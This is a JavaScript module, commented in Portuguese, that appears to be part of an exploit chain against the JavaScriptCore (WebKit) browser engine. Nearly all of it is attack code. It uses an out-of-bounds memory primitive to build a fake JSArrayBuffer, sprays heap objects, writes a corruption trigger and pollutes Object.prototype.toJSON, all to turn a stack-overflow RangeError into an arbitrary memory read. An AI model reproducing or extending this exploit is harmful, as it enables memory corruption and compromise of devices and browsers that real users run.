// js/script3/testRangeErrorToArbitraryRead.mjs (Novo Arquivo)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Classe que demonstrou o RangeError
class MyComplexObjectForREExploit {
    constructor(id) {
        this.id = `MyComplexObjRE_Exploit-${id}`;
        this.marker = 0xABAB1234;
        this.prop1 = "data_A";
        this.prop2 = { nested: "data_B" };
        // Adicionar mais propriedades para aumentar a chance do for...in ser longo
        for(let i=0; i<5; i++) this[`filler_prop_${i}`] = `filler_val_${i}`;
    }
}

// Variável global para armazenar o offset do nosso fake AB
let g_fake_ab_offset_in_oob_content = 0;
let g_target_arbitrary_read_address_for_fake_ab = null;

// toJSON que sabemos que pode causar RangeError ao acessar this[prop]
// e que tentará uma leitura arbitrária no bloco catch.
export function toJSON_AttemptReadOnRangeError() {
    const FNAME_toJSON = "toJSON_AttemptReadOnRangeError";
    let iteration_count = 0;
    const MAX_ITER_BEFORE_EXPECTED_RANGE_ERROR = 50; // Tentar iterar um pouco

    logS3(`[${FNAME_toJSON}] Entrando. this.id (tentativa): ${String(this?.id).substring(0,20)}`, "info", FNAME_toJSON);
    let payload = {variant: FNAME_toJSON, id_at_entry: String(this?.id).substring(0,20), range_error_caught: false, arb_read_success: false, arb_read_val: "N/A", arb_read_error: null};

    try {
        for (const prop in this) {
            iteration_count++;
            logS3(`  [${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${String(prop).substring(0,30)}'`, "info", FNAME_toJSON);
            try {
                const val = this[prop]; // Este acesso é o que esperamos que cause RangeError
            } catch (e_prop_access) {
                 logS3(`  [${FNAME_toJSON}] Erro INTERNO ao acessar this['${prop}']: ${e_prop_access.name}`, "warn", FNAME_toJSON);
                 // Não re-lançar, deixar o JSON.stringify pegar o RangeError se for mais profundo
            }
            if (iteration_count >= MAX_ITER_BEFORE_EXPECTED_RANGE_ERROR) {
                logS3(`  [${FNAME_toJSON}] Atingiu ${MAX_ITER_BEFORE_EXPECTED_RANGE_ERROR} iterações sem RangeError capturável.`, "warn", FNAME_toJSON);
                break;
            }
        }
    } catch (e_outer_loop_or_range) { // Pode pegar o RangeError se ele acontecer dentro do loop
        logS3(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN: ${e_outer_loop_or_range.name} - ${e_outer_loop_or_range.message}`, "error", FNAME_toJSON);
        if (e_outer_loop_or_range.name === 'RangeError') {
            payload.range_error_caught = true;
            logS3(`  [${FNAME_toJSON}] RangeError PEGO DENTRO DO LOOP! Tentando leitura arbitrária...`, "vuln", FNAME_toJSON);
            try {
                const data_ptr_offset = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);
                const size_offset = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);

                const fake_ab_data_ptr = oob_read_absolute(g_fake_ab_offset_in_oob_content + data_ptr_offset, 8);
                const fake_ab_size = oob_read_absolute(g_fake_ab_offset_in_oob_content + size_offset, 4);

                logS3(`    FakeAB m_dataPointer: ${fake_ab_data_ptr.toString(true)}, m_size: ${toHex(fake_ab_size)}`, "info", FNAME_toJSON);
                if (fake_ab_size > 0 && fake_ab_size < 0x10000000) {
                    const leaked_val = oob_read_absolute(fake_ab_data_ptr, Math.min(4, fake_ab_size));
                    payload.arb_read_val = toHex(leaked_val);
                    payload.arb_read_success = true;
                    logS3(`    !!!! LEITURA ARBITRÁRIA NO CATCH DO RANGEERROR !!!! *(${fake_ab_data_ptr.toString(true)}) = ${toHex(leaked_val)}`, "critical", FNAME_toJSON);
                    document.title = "SUCCESS: ArbRead in RE Catch!";
                }
            } catch (e_read_in_catch) {
                payload.arb_read_error = e_read_in_catch.message;
                logS3(`    ERRO na tentativa de leitura arbitrária no catch: ${e_read_in_catch.message}`, "error", FNAME_toJSON);
            }
        }
    }
    return payload;
}

export async function executeRangeErrorToArbitraryReadTest() {
    const FNAME_TEST = "executeRangeErrorToArbitraryReadTest";
    logS3(`--- Iniciando Teste: RangeError para Leitura Arbitrária ---`, "test", FNAME_TEST);
    document.title = `RangeError to ArbRead`;

    // 1. Construir o JSArrayBuffer Falso no conteúdo do oob_array_buffer_real
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) { logS3("Falha OOB Setup.", "error", FNAME_TEST); return; }

    g_fake_ab_offset_in_oob_content = 0x300; // Offset conhecido
    g_target_arbitrary_read_address_for_fake_ab = new AdvancedInt64("0x0002000000000000"); // Endereço de leitura alvo
    const arbitrary_read_size = 0x100;

    logS3(`1. Construindo JSArrayBuffer Falso em oob_content[${toHex(g_fake_ab_offset_in_oob_content)}]...`, "info", FNAME_TEST);
    try {
        oob_write_absolute(g_fake_ab_offset_in_oob_content + 0x0, JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, 4);
        oob_write_absolute(g_fake_ab_offset_in_oob_content + parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16), AdvancedInt64.Zero, 8);
        oob_write_absolute(g_fake_ab_offset_in_oob_content + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16), arbitrary_read_size, 4);
        oob_write_absolute(g_fake_ab_offset_in_oob_content + parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16), g_target_arbitrary_read_address_for_fake_ab, 8);
        logS3(`   JSArrayBuffer Falso construído. Target: ${g_target_arbitrary_read_address_for_fake_ab.toString(true)}, Size: ${toHex(arbitrary_read_size)}`, "good", FNAME_TEST);
    } catch (e_build) { /* ... erro ... */ clearOOBEnvironment(); return; }

    // 2. Spray
    const spray_count = 5;
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForREExploit...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) sprayed_objects.push(new MyComplexObjectForREExploit(i));

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Corrupção Gatilho
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    logS3(`3. Escrevendo trigger 0xFFFFFFFF em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, 0xFFFFFFFF, 4);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir e Chamar
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    const obj_to_probe = sprayed_objects[0];

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_AttemptReadOnRangeError,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_AttemptReadOnRangeError.name}.`, "info", FNAME_TEST);

        logS3(`5. Sondando objeto ${obj_to_probe.id}... TENTANDO CAPTURAR RANGEERROR.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id} (REtoArbRead)`;
        const stringifyResult = JSON.stringify(obj_to_probe);
        logS3(`     JSON.stringify(obj[0]) completou (INESPERADO se RangeError era esperado). Resultado da toJSON:`, "warn", FNAME_TEST);
        logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST);

    } catch (e_str) { // Captura RangeError do JSON.stringify, se a toJSON não o pegar e re-lançar.
        logS3(`     !!!! ERRO AO STRINGIFY obj[0] (EXTERNO À toJSON): ${e_str.name} - ${e_str.message} !!!!`, "critical", FNAME_TEST);
        if (e_str.name === 'RangeError') {
            logS3(`       ---> RangeError (Estouro de Pilha Nativo) OCORREU! <---`, "vuln", FNAME_TEST);
            // Aqui, o RangeError aconteceu, mas fora do try/catch da toJSON.
            // Precisaríamos que o catch da toJSON funcionasse.
            document.title = `RangeError CAUGHT EXTERNALLY!`;
        }
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste RangeError para Leitura Arbitrária CONCLUÍDO ---`, "test", FNAME_TEST);
}
